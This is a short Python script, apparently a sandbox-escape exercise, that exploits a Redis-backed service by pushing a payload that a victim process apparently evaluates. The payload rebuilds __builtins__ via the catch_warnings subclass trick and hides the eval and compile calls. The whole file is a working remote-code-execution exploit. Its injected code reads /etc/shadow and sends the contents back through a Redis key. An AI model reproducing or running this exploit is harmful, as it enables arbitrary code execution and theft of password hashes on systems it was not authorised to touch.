#! /usr/bin/env python
#
# hkr2: exploit a key by remote executing arbitrary code


from redis import StrictRedis

from vic import KEY
from hkr import bypass


OKEY = "hacked"


def inject(code):
    trick = ("[x for x in (1).__class__.__base__.__subclasses__()" +
             " if x.__name__ == 'catch_warnings'][0]()" +
             "._module.__builtins__")
    # build the shell code
    _shell = (("(lambda arg=eval(compile('%s', '<string>', 'exec')," +
               " {'__builtins__': %s}): 'hacked')()") %
              (code.replace("\n", "\\n"), trick))
    shell = bypass(_shell, ["eval", "compile"])
    # some tests
    #print shell
    #print eval(shell, {"__builtins__": {}})
    # send it to the remote server
    rcon = StrictRedis()
    rcon.rpush(KEY, shell)


def main():
    code = """
from redis import StrictRedis
myr = StrictRedis()
with open("/etc/shadow") as fin:
    myr.rpush("{}", fin.read())
"""

    inject(code.format(OKEY))
    myr = StrictRedis()
    print myr.blpop(OKEY)[1]


if __name__ == "__main__":
    main()
